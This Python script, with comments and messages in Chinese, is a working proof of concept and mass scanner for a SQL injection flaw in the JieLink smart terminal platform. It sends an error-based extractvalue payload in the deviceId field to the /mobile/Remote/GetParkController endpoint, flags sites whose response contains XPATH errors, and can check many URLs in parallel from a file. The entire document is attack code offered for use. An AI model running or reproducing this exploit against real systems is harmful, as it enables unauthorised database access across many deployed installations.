import requests,argparse,time,sys,urllib
from urllib.parse import unquote
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def banner():
    test = """
        ___ _    , __   _
          /' )  / /  )_//
         /  /  / /  / /  
        /__(__/_(_\/ /___
            //     `     
           (/            
"""
    print(test)
def poc(target):
    payload= "/mobile/Remote/GetParkController"
    data = "deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'"

    try:
        res1 = requests.post(url=target+payload,data=data,verify=False)
        print(res1.text)
        if "XPATH" in unquote(res1.text):
            print(f"[+]{target}sql注入漏洞")
            with open ("JL_result.txt","a",encoding="utf-8") as f:
                f.write(f"[+]{target}存在sql注入漏洞\n")

        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")



def main():
    banner()
    parser =argparse.ArgumentParser(description="JieLink智能终端操作平台后台存在通用SQL注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")



if __name__ == '__main__':
    main()